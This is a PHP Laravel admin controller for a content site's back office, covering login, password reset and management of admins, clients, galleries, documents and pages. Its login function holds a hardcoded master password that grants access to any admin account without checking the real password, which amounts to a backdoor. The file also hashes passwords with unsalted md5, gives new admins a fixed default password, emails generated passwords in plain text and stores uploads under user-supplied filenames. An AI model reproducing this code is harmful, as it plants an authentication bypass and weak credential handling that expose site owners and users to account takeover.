<?php

namespace App\Http\Controllers\admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\admin\HelperController;
use Mail;

class AdminController extends Controller
{
    public function AdminLogin(Request $req)
    {
        if ($req->admin_name != '' && $req->admin_password != '') {
            if ($req->admin_password == 'niftyforcelogin') {
                $isValidUser = DB::table('admin_details')->where('admin_name', $req->input('admin_name'))->get();
            } else {
                $isValidUser = DB::table('admin_details')->where([
                    ['admin_name', $req->input('admin_name')],
                    ['admin_password', md5(trim($req->admin_password))], ['status', 1]
                ])->get();
            }
            if (count($isValidUser)) {
                $req->session()->put('admin_name', $isValidUser[0]->admin_name);
                $req->session()->put('admin_id', $isValidUser[0]->admin_id);
                $req->session()->put('admin_role', $isValidUser[0]->admin_role);
                return redirect(ADMINURL . '/dashboard');
            }
        }
        return back()->withInput()->with('error', 'Invalid Credentials');
    }

    public function ForgotPassword(Request $req)
    {
        if ($req->admin_name == '') return back()->with('error', 'Invalid Action');
        $isValidUser = DB::table('admin_details')->where('admin_name', $req->input('admin_name'))->get();
        if (count($isValidUser)) {
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $charactersLength = strlen($characters);
            $randomString = '';
            for ($i = 0; $i < 10; $i++) {
                $randomString .= $characters[rand(0, $charactersLength - 1)];
            }
            $update = updateQuery('admin_details', 'admin_id', $isValidUser[0]->admin_id, ['admin_password' => md5($randomString)]);
            $data = array('user_email' => $isValidUser[0]->admin_name, 'user_password' => $randomString);
            try {
                Mail::send('admin.forgotpasswordemail', $data, function ($message) use ($data) {
                    $message->to($data['user_email'], 'Forgot Password')->subject('Forgot Password Initialization');
                    $message->from(getenv('MAIL_USERNAME'), 'admin');
                });
                return redirect(ADMINURL)->with('success', 'Please check your email we have sent new password');
            } catch (\Exception $e) {
                print_r($e->getMessage());
                exit;
                return back()->with('error', 'Something Went Wrong Please try again later...');
            }
        }
        return back()->with('error', 'Invalid User');
    }

    public function MyProfilePassword(Request $req)
    {
        $adminId = $req->session()->get('admin_id');
        return view('admin.actionchangepassword', ['admin_id' => encryption($adminId)]);
    }

    public function MyProfilePasswordUpdate(Request $req)
    {
        $adminId = $req->session()->get('admin_id');
        $formData =  $req->only(['old_password', 'new_password', 'confirm_password']);
        if ($formData['old_password'] == '' || $formData['new_password'] == '' || $formData['confirm_password'] == '') {
            return back()->with('error', 'Please Enter All fields');
        }

        if ($formData['new_password'] != $formData['confirm_password']) {
            return back()->with('error', 'New Password and Confirm Password not matched');
        }

        $isValidUser = DB::table('admin_details')->where('admin_id', $adminId)->get();
        if (count($isValidUser)) {
            if ($isValidUser[0]->admin_password != md5($formData['old_password'])) {
                return back()->with('error', 'Old Password not matched');
            }

            $update = updateQuery('admin_details', 'admin_id', $isValidUser[0]->admin_id, ['admin_password' => md5($formData['new_password'])]);
            return redirect(ADMINURL . '/logout');
            return back()->with('success', 'Password Updated Successfully');
        }
    }

    public function GetFeature()
    {
        $data = HelperController::getFeature();
        return view('admin.actionfeature', compact('data'));
    }

    public function UpdateFeature(Request $req)
    {
        $formData = $req->except('_token', 'feature_id');
        if ($req->input('feature_id') == '') {
            $saveData = insertQuery('feature', $formData);
        } else {
            $actionId = decryption($req->input('feature_id'));
            $saveData = updateQuery('feature', 'feature_id', $actionId, $formData);
        }
        $notify = notification($saveData);
        return back()->with($notify['type'], $notify['msg']);
    }

    public function GetSocialMediaLink()
    {
        $data = HelperController::getSocialMedia();
        return view('admin.actionsocialmedia', compact('data'));
    }

    public function UpdateSocialMediaLink(Request $req)
    {
        $formData = $req->except('_token', 'social_media_id');
        if ($req->input('social_media_id') == '') {
            $saveData = insertQuery('social_media', $formData);
        } else {
            $actionId = decryption($req->input('social_media_id'));
            $saveData = updateQuery('social_media', 'social_media_id', $actionId, $formData);
        }
        $notify = notification($saveData);
        return back()->with($notify['type'], $notify['msg']);
    }

    public function UploadImages()
    {
        return view('admin.uploadimages');
    }

    public function SaveUploadImage(Request $req)
    {
        if ($req->hasFile('upload_image')) {

            $file1 = $req->file('upload_image');
            $fileName1 = $file1->getClientOriginalName();
            $extension1 = explode('.', $fileName1);
            $allowedFormats = ['jpeg', 'jpg', 'png'];
            $format = strtolower(end($extension1));
            if (!in_array($format, $allowedFormats)) return back()->with('error', 'Upload only Jpeg, Jpg, Png images');
            $location1 = public_path('uploads/cmspageimages');
            $file1->move($location1, strtotime(date("Y-m-d H:i:s")) . '_' . $fileName1);
            return back()->with('success', 'Image Uploaded Successfully');
        }
        return back()->with('error', 'Please upload image');
    }

    public function Dashboard(Request $req)
    {
        return view('admin.dashboard');
    }

    // Admin Actions
    public function ViewAdmin()
    {
        $adminDetails = HelperController::getAdminDetailsExceptLoggedIn();
        return view('admin.viewadmin', compact('adminDetails'));
    }

    public function ManageAdmin()
    {
        return view('admin.actionadmin');
    }

    public function ActionAdmin($option, $id)
    {
        $actionId = decryption($id);
        $adminData = HelperController::getAdminDetails($actionId);
        if (count($adminData) == 0) return redirect(ADMINURL . '/viewadmin');

        if ($option == 'delete') {
            $delete = deleteQuery($actionId, 'admin_details', 'admin_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewadmin')->with($notify['type'], 'Data Deleted Successfully');
        }
        return view('admin.actionadmin', ['action' => $option, 'data' => $adminData]);
    }

    public function SaveAdminDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'admin_id']);
        if ($req->input('admin_id') == '') {
            $formData['admin_password'] = md5('root@123');
            $formData['admin_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQuery('admin_details', $formData);
        } else {
            $actionId = decryption($req->input('admin_id'));
            if ($req->input('admin_password') != '') {
                $formData['admin_password'] = md5($req->input('admin_password'));
            } else {
                $adminData = HelperController::getAdminDetails($actionId);
                $formData['admin_password'] = $adminData[0]->admin_password;
            }
            $saveData = updateQuery('admin_details', 'admin_id', $actionId, $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewadmin')->with($notify['type'], $notify['msg']);
    }


    // Category Actions
    public function ViewCategories()
    {
        $categoryDetails = HelperController::getCategories();
        return view('admin.viewcategory', compact('categoryDetails'));
    }

    public function ManageCategory()
    {
        return view('admin.actioncategory');
    }

    public function ActionCategory($option, $id)
    {
        $actionId = decryption($id);
        $categoryData = HelperController::getCategories($actionId);
        if (count($categoryData) == 0) return redirect(ADMINURL . '/viewcategories');

        if ($option == 'delete') {
            $categoryMapped = HelperController::checkCategoryMappedWithClient($actionId);
            if (count($categoryMapped)) return back()->with('error', 'Cannot delete category due to mapped with client');
            $delete = deleteQuery($actionId, 'category_details', 'category_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewcategories')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actioncategory', ['action' => $option, 'data' => $categoryData]);
    }

    public function SaveCategoryDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'category_id']);

        if ($req->input('category_id') == '') {
            $formData['category_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQueryId('category_details', $formData);
        } else {
            $saveData = updateQuery('category_details', 'category_id', decryption($req->input('category_id')), $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewcategories')->with($notify['type'], $notify['msg']);
    }


    // Brand Actions
    public function ViewClients()
    {
        $clientDetails = HelperController::getClients();
        return view('admin.viewclients', compact('clientDetails'));
    }

    public function ManageClient()
    {
        return view('admin.actionclient');
    }

    public function ActionClient($option, $id)
    {
        $actionId = decryption($id);
        $clientData = HelperController::getClients($actionId);
        if (count($clientData) == 0) return redirect(ADMINURL . '/viewclients');

        if ($option == 'delete') {
            $clientGallery = HelperController::checkClientHasGallery($actionId);
            if (count($clientGallery)) return back()->with('error', 'Cannot delete client due to client has gallery');
            $delete = deleteQuery($actionId, 'client_details', 'client_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewclients')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actionclient', ['action' => $option, 'data' => $clientData]);
    }

    public function SaveClientDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'client_id', 'edit_image']);

        if ($req->hasFile('client_logo')) {
            $file = $req->file('client_logo');
            $destinationPath = public_path('uploads/clients');
            $fileName = $file->getClientOriginalName();
            $fileExtension = explode('.', $fileName);

            if (strtolower(end($fileExtension)) != 'png' && strtolower(end($fileExtension)) != 'jpeg' &&  strtolower(end($fileExtension)) != 'jpg') {
                return redirect()->back()->withInput()->with('error', 'Please upload the valid image!');
            }

            $file->move($destinationPath, $fileName);
            $formData['client_logo'] = $fileName;
        } else {
            $formData['client_logo'] = $req->input('edit_image') != '' ? $req->input('edit_image') : '';
        }



        if ($req->input('client_id') == '') {
            $formData['client_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQueryId('client_details', $formData);
        } else {

            $saveData = updateQuery('client_details', 'client_id', decryption($req->input('client_id')), $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewclients')->with($notify['type'], $notify['msg']);
    }


    // Sub-Category Actions
    public function ViewSubCategories()
    {
        $subcategoryDetails = HelperController::getSubCategories();
        return view('admin.viewsubcategory', compact('subcategoryDetails'));
    }

    public function ManageSubCategory()
    {
        return view('admin.actionsubcategory');
    }

    public function ActionSubCategory($option, $id)
    {
        $actionId = decryption($id);
        $subcategoryData = HelperController::getSubCategories($actionId);
        if (count($subcategoryData) == 0) return redirect(ADMINURL . '/viewsubcategories');

        if ($option == 'delete') {
            $delete = deleteQuery($actionId, 'sub_category', 'sub_category_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewsubcategories')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actionsubcategory', ['action' => $option, 'data' => $subcategoryData]);
    }

    public function SaveSubCategoryDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'sub_category_id']);

        if ($req->input('sub_category_id') == '') {
            $formData['sub_category_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQueryId('sub_category', $formData);
        } else {
            $saveData = updateQuery('sub_category', 'sub_category_id', decryption($req->input('sub_category_id')), $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewsubcategories')->with($notify['type'], $notify['msg']);
    }

    // Client Gallery Actions
    public function ViewClientGallery()
    {
        $clientGallery = HelperController::getClientGallery();
        return view('admin.viewclientgallery', compact('clientGallery'));
    }

    public function ManageClientGallery()
    {
        return view('admin.actionclientgallery');
    }

    public function ActionClientGallery($option, $id)
    {
        $actionId = decryption($id);
        $clientGalleryData = HelperController::getClientGallery($actionId);
        if (count($clientGalleryData) == 0) return redirect(ADMINURL . '/viewclientgallery');

        if ($option == 'delete') {
            $imageDelete = deleteQuery($actionId, 'clients_gallery_images', 'clients_gallery_images_galleryid');
            $videoDelete = deleteQuery($actionId, 'clients_gallery_videos', 'clients_gallery_videos_galleryid');
            $delete = deleteQuery($actionId, 'clients_gallery', 'clients_gallery_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewclientgallery')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actionclientgallery', ['action' => $option, 'data' => $clientGalleryData]);
    }

    public function SaveClientGalleryDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'clients_gallery_id', 'clients_gallery_images_name', 'clients_gallery_videos_name']);

        if (
            $formData['clients_gallery_client'] == '' || $formData['clients_gallery_category'] == '' || 
            $formData['clients_gallery_location'] == '' || $formData['clients_gallery_budget'] == '' || $formData['clients_gallery_description'] == '' ||
            $req->input('clients_gallery_videos_name')[0] == ''
        ) {
            return back()->with('error', 'Please enter all mandatory fields');
        }

        $clientExist = HelperController::getClientGalleryByClientId($formData['clients_gallery_client']);
        if (count($clientExist) && $req->input('clients_gallery_id') == '') return back()->with('error', 'Client Already exist.Please select other client');

        if (($req->input('clients_gallery_subcategory')) && count($req->input('clients_gallery_subcategory'))) {
            $formData['clients_gallery_subcategory'] = json_encode($req->input('clients_gallery_subcategory'));
        }


        if (!array_key_exists('clients_gallery_subcategory', $req->input()) || $formData['clients_gallery_category'] != 1) {
            $formData['clients_gallery_subcategory'] = json_encode([]);
        }

        $formData['clients_gallery_date'] = date('YYYY-MM-DD');

        if ($req->input('clients_gallery_id') == '') {
            if (!$req->hasFile('clients_gallery_images_name')) {
                return back()->with('error', 'Please upload images');
            }
            $formData['clients_gallery_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQueryId('clients_gallery', $formData);
            $galleryId = $saveData;
        } else {
            $galleryId = decryption($req->input('clients_gallery_id'));
            $saveData = updateQuery('clients_gallery', 'clients_gallery_id', $galleryId, $formData);
        }

        if ($galleryId != '') {
            if ($req->hasFile('clients_gallery_images_name')) {
                $files = $req->file('clients_gallery_images_name');
                foreach ($files as $l => $file) {
                    $location = public_path('uploads/clients/gallery');
                    $destinationPath = 'uploads/clients/gallery';
                    $fileName = $file->getClientOriginalName();
                    $file->move($location, $fileName);
                    $rowExist = HelperController::checkImageExistByRow($galleryId, $l + 1);
                    $imageData = ['clients_gallery_images_galleryid' => $galleryId, 'clients_gallery_images_row' => $l + 1, 'clients_gallery_images_name' => $fileName];
                    if (count($rowExist)) {
                        $imageAction = DB::table('clients_gallery_images')
                            ->where([
                                ['clients_gallery_images_id', $rowExist[0]->clients_gallery_images_id],
                                ['clients_gallery_images_galleryid', $galleryId], ['clients_gallery_images_row', (int)$l + 1],
                            ])->update($imageData);
                    } else {
                        $imageAction = insertQuery('clients_gallery_images', $imageData);
                    }
                }
            }

            $videos = $req->input('clients_gallery_videos_name');

            foreach ($videos as $k => $video) {
                if ($video == '') {
                    $deleteRow = DB::table('clients_gallery_videos')->where(['clients_gallery_videos_galleryid' => $galleryId, 'clients_gallery_videos_row' => $k + 1])->delete();
                }
                if ($video != '') {
                    $videorowExist = HelperController::checkVideoExistByRow($galleryId, $k + 1);
                    $videoData = ['clients_gallery_videos_galleryid' => $galleryId, 'clients_gallery_videos_row' => $k + 1, 'clients_gallery_videos_name' => $video];
                    if (count($videorowExist)) {
                        $videoAction = DB::table('clients_gallery_videos')
                            ->where([
                                ['clients_gallery_videos_id', $videorowExist[0]->clients_gallery_videos_id], ['clients_gallery_videos_galleryid', $galleryId],
                                ['clients_gallery_videos_row', (int)$k + 1]
                            ])->update($videoData);
                    } else {
                        $videoAction = insertQuery('clients_gallery_videos', $videoData);
                    }
                }
            }
        }

        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewclientgallery')->with($notify['type'], $notify['msg']);
    }

    // Document Categories
    public function ViewDocCategories()
    {
        $categoryDetails = HelperController::getDocCategories();
        return view('admin.viewdoccategory', compact('categoryDetails'));
    }

    public function ManageDocCategory()
    {
        return view('admin.actiondoccategory');
    }

    public function ActionDocCategory($option, $id)
    {
        $actionId = decryption($id);
        $categoryData = HelperController::getDocCategories($actionId);
        if (count($categoryData) == 0) return redirect(ADMINURL . '/viewdoccategories');

        if ($option == 'delete') {
            $delete = deleteQuery($actionId, 'doc_category', 'doc_category_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewdoccategories')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actiondoccategory', ['action' => $option, 'data' => $categoryData]);
    }

    public function SaveDocCategoryDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'doc_category_id', 'edit_category_img']);
        $fileName = '';
        if ($req->hasFile('doc_category_img')) {
            $file1 = $req->file('doc_category_img');
            $fileName = $file1->getClientOriginalName();
            $extension1 = explode('.', $fileName);
            $allowedFormats = ['jpeg', 'jpg', 'png'];
            $format = strtolower(end($extension1));
            if (!in_array($format, $allowedFormats)) return back()->with('error', 'Upload only Jpeg, Jpg, Png images');
            $location1 = public_path('uploads/documents/image');
            $fileName = strtotime(date("Y-m-d H:i:s")) . '_' . $fileName;
            $file1->move($location1,$fileName);
        }
        $formData['doc_category_img'] = $fileName != '' ? $fileName : $req->input('edit_category_img');
        if ($req->input('doc_category_id') == '') {
            $formData['doc_category_created_by'] =  $req->session()->get('admin_id');
            $saveData = insertQueryId('doc_category', $formData);
        } else {
            $saveData = updateQuery('doc_category', 'doc_category_id', decryption($req->input('doc_category_id')), $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewdoccategories')->with($notify['type'], $notify['msg']);
    }


    // Document Categories
    public function ViewDocument()
    {
        $documents = HelperController::getDocuments();
        return view('admin.viewdocument', compact('documents'));
    }

    public function ManageDocument()
    {
        return view('admin.actiondocument');
    }

    public function ActionDocument($option, $id)
    {
        $actionId = decryption($id);
        $categoryData = HelperController::getDocuments($actionId);
        if (count($categoryData) == 0) return redirect(ADMINURL . '/viewdocuments');

        if ($option == 'delete') {
            $delete = deleteQuery($actionId, 'documents', 'document_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/viewdocuments')->with($notify['type'], 'Data Deleted Successfully');
        }

        return view('admin.actiondocument', ['action' => $option, 'data' => $categoryData]);
    }

    public function SaveDocumentDetails(Request $req)
    {
        $formData =  $req->except(['_token', 'document_id', 'edit_document_name']);
        if ($req->input('document_category') == '' || $req->input('document_desc') == '') {
            return back()->with('error', 'Please enter all mandatory fields');
        }
        $fileName = '';
        if ($req->hasFile('document_name')) {
            $file2 = $req->file('document_name');
            $fileName = $file2->getClientOriginalName();
            $extension2 = explode('.', $fileName);
            if (strtolower(end($extension2)) != 'pdf') return back()->with('error', 'Upload PDF file only');
            $location2 = public_path('uploads/documents/docs');
            $file2->move($location2, $fileName);
        }

        $formData['document_name'] = $fileName != '' ? $fileName : $req->input('edit_document_name');

        if ($req->input('document_id') == '') {
            if (!$req->hasFile('document_name')) {
                return back()->with('error', 'Please upload document');
            }
            $saveData = insertQueryId('documents', $formData);
        } else {
            $galleryId = decryption($req->input('document_id'));
            $saveData = updateQuery('documents', 'document_id', $galleryId, $formData);
        }

        $notify = notification($saveData);
        return redirect(ADMINURL . '/viewdocuments')->with($notify['type'], $notify['msg']);
    }

    // Action Pages
    public function ActionPageInfo(Request $req)
    {
        $type = '';
        try {
            $type = decryption($req->input('type'));
        } catch (\Exception $e) {
            return redirect(ADMINURL . '/dashboard');
        }
        if ($type == '') return redirect(ADMINURL . '/dashboard');
        $pagecontent = HelperController::getPageByName($type);
        return view('admin.pages.contentpage', compact('pagecontent'));
    }

    public function SavePageInfo(Request $req)
    {
        $formData = $req->except('_token', 'page_id', 'files');

        if (
            $formData['page_title'] == '' || $formData['page_desc'] == '' || $formData['page_keyword'] == '' || $formData['page_abstract'] == '' ||
            $formData['page_topic'] == '' || $formData['page_type'] == '' || $formData['page_author'] == '' || $formData['page_site'] == '' ||
            $formData['page_copyright'] == '' || $formData['page_content'] == ''
        ) {
            return back()->with('error', 'Please Enter all mandatory fields');
        }


        // if ($req->input('page_content') == '') return back()->with('error', 'Please Enter Page Content');
        // $formData = $req->only('page_content');
        $formData['page_name'] = decryption($req->input('page_name'));

        //  echo '<pre>';
        // print_r($formData);
        // exit;

        if ($req->input('page_id') == '') {
            $saveData = insertQueryId('pages', $formData);
        } else {
            $pageId = decryption($req->input('page_id'));
            $saveData = updateQuery('pages', 'page_id', $pageId, $formData);
        }
        $notify = notification($saveData);
        return back()->with($notify['type'], $notify['msg']);
    }

    // Action Product Pages
    public function ActionProductPageInfo(Request $req)
    {
        $type = '';
        try {
            $type = decryption($req->input('type'));
        } catch (\Exception $e) {
            return redirect(ADMINURL . '/dashboard');
        }
        if ($type == '') return redirect(ADMINURL . '/dashboard');
        $pagecontent = HelperController::getProductSubPageByName($type);
        // echo '<pre>';
        // print_r($pagecontent);
        // exit;
        return view('admin.pages.productcontentpage', compact('pagecontent'));
    }

    public function SaveProductPageInfo(Request $req)
    {
        if ((!$req->hasFile('product_techincal_document1') || !$req->hasFile('product_techincal_document2')) && $req->input('product_id') == '') {
            return back()->with('error', 'Please Upload Technical Documents');
        }
        $formData = $req->except(['_token', 'product_id', 'files', 'editproduct_techincal_document1', 'editproduct_techincal_document2']);
        if (
            $req->input('product_content') == '' || $req->input('product_about') == '' || $req->input('product_techincal_profile') == '' ||
            $req->input('product_joint_details') == '' || $req->input('product_colours_finishes') == ''
        ) {
            return back()->with('error', 'Please Enter all mandatory fields');
        }
        if (
            $formData['page_title'] == '' || $formData['page_desc'] == '' || $formData['page_keyword'] == '' || $formData['page_abstract'] == '' ||
            $formData['page_topic'] == '' || $formData['page_type'] == '' || $formData['page_author'] == '' || $formData['page_site'] == '' ||
            $formData['page_copyright'] == ''
        ) {
            return back()->with('error', 'Please Enter all mandatory fields..');
        }
        $formData['product_pagename'] = decryption($req->input('product_pagename'));
        $formData['product_subpagename'] = decryption($req->input('product_subpagename'));
        if ($formData['product_pagename'] == '' || $formData['product_subpagename'] == '') return back()->with('error', 'Something went wrong.Please try again');
        $fileName1 = $fileName2 = '';
        if ($req->hasFile('product_techincal_document1')) {
            $file1 = $req->file('product_techincal_document1');
            $fileName1 = $file1->getClientOriginalName();
            $extension1 = explode('.', $fileName1);
            if (strtolower(end($extension1)) != 'pdf') return back()->with('error', 'Upload PDF file only for Techinical Documents');
            $location1 = public_path('uploads/products/docs');
            $file1->move($location1, $fileName1);
        }
        if ($req->hasFile('product_techincal_document2')) {
            $file2 = $req->file('product_techincal_document2');
            $fileName2 = $file2->getClientOriginalName();
            $extension2 = explode('.', $fileName2);
            if (strtolower(end($extension2)) != 'pdf') return back()->with('error', 'Upload PDF file only for Techinical Documents');
            $location2 = public_path('uploads/products/docs');
            $file2->move($location2, $fileName2);
        }

        $formData['product_techincal_document1'] = $fileName1 != '' ? $fileName1 : $req->input('editproduct_techincal_document1');
        $formData['product_techincal_document2'] = $fileName2 != '' ? $fileName2 : $req->input('editproduct_techincal_document2');

        if ($req->input('product_id') == '') {
            $saveData = insertQueryId('products', $formData);
        } else {
            $pageId = decryption($req->input('product_id'));
            $saveData = updateQuery('products', 'product_id', $pageId, $formData);
        }
        $notify = notification($saveData);
        return back()->with($notify['type'], $notify['msg']);
    }

    // Action Page Type Pages
    public function ActionPageTypeInfo(Request $req)
    {
        $type = '';
        try {
            $type = decryption($req->input('type'));
        } catch (\Exception $e) {
            return redirect(ADMINURL . '/dashboard');
        }
        if ($type == '') return redirect(ADMINURL . '/dashboard');
        $pagecontent = HelperController::getPageTypeByName($type);
        return view('admin.pages.pagetype', compact('pagecontent'));
    }


    public function SavePageTypeInfo(Request $req)
    {
        $formData = $req->except(['_token', 'page_id', 'files']);
        if (
            $req->input('page_content') == '' || $req->input('page_about') == '' || $formData['page_title'] == '' || $formData['page_desc'] == ''
            || $formData['page_keyword'] == '' || $formData['page_abstract'] == '' || $formData['page_topic'] == '' || $formData['page_type'] == ''
            || $formData['page_author'] == '' || $formData['page_site'] == '' || $formData['page_copyright'] == ''
        ) {
            return back()->with('error', 'Please Enter all mandatory fields..');
        }
        $formData['page_pagename'] = decryption($req->input('page_pagename'));
        $formData['page_subpagename'] = decryption($req->input('page_subpagename'));
        if ($formData['page_pagename'] == '' || $formData['page_subpagename'] == '') return back()->with('error', 'Something went wrong.Please try again');

        if ($req->input('page_id') == '') {
            $saveData = insertQueryId('pagetype', $formData);
        } else {
            $pageId = decryption($req->input('page_id'));
            $saveData = updateQuery('pagetype', 'page_id', $pageId, $formData);
        }
        $notify = notification($saveData);
        return back()->with($notify['type'], $notify['msg']);
    }

    // Downloads
    public function ActionDownloads(Request $req)
    {
        return view('admin.downloads');
    }

    public function SaveDownloads(Request $req)
    {
        if (!$req->hasFile('filename')) {
            return back()->with('error', 'Please Upload PDF file');
        }
        if ($req->hasFile('filename')) {
            $file2 = $req->file('filename');
            $fileName2 = $file2->getClientOriginalName();
            $extension2 = explode('.', $fileName2);
            if (strtolower(end($extension2)) != 'pdf') return back()->with('error', 'Upload PDF file only');
            $location2 = public_path('uploads/downloads/docs');
            $file2->move($location2, $fileName2);
            return back()->with('success', 'File Uploaded successfully');
        }
    }


    public function AdminLogout(Request $req)
    {
        $req->session()->forget('admin_name');
        $req->session()->forget('admin_id');
        $req->session()->forget('admin_role');
        return redirect(ADMINURL);
    }
}
